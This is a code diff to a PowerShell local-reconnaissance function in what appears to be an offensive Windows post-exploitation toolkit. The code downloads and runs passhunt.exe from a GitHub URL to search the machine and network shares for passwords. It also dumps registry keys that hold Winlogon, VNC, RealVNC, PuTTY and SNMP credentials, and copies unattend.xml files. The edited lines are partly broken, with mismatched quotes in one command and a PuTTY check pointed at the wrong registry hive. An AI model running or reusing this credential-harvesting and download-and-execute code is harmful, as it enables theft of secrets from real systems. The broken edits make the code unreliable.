@@ -325,7 +325,7 @@ function localreconmodules
             {
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                 Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
-                invoke-expression "cmd /c start powershell -Command {.\passhunt.exe -o $currentPath}"
+                invoke-expression 'cmd /c start powershell -Command {.\passhunt.exe -o %TEMP%}'
                 $sharepasshunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
                 if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
                 {
@@ -333,14 +333,14 @@ function localreconmodules
                     $shares = get-content .\passhuntshares.txt | select-object -skip 4
                     foreach ($line in $shares)
                     {
-                       invoke-expression "cmd /c start powershell -Command {.\passhunt.exe -s $line -o $currentPath}" 
+                       invoke-expression "cmd /c start powershell -Command '.\passhunt.exe -s $line -o %TEMP%}' 
                     }
                     
                 }
             }
             
             # Collecting more information
-            $snmp = Test-Path -Path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP
+            $snmp = Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'
             If ($snmp -eq "True")
             {
                 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse >> "$currentPath\LocalRecon\SNMP.txt"
@@ -357,11 +357,14 @@ function localreconmodules
             REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
             REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"
 
-            If (Test-Path -Path HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon){reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"}
-            If (Test-Path -Path HKLM\SYSTEM\Current\ControlSet\Services\SNMP){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
-            If (Test-Path -Path HKCU\Software\SimonTatham\PuTTY\Sessions){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\LocalRecon\PuttySessions.txt"}
-            If (Test-Path -Path HKCU\Software\ORL\WinVNC3\Password){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\LocalRecon\VNCPassword.txt"}
-            If (Test-Path -Path HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\LocalRecon\RealVNCPassword.txt"}
+            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
+	    {
+	    	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"
+	    }
+            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
+            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\LocalRecon\PuttySessions.txt"}
+            If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\LocalRecon\VNCPassword.txt"}
+            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\LocalRecon\RealVNCPassword.txt"}
 
             If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow "Unattended.xml Found, check it for passwords"}
             If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow "Unattended.xml Found, check it for passwords"}
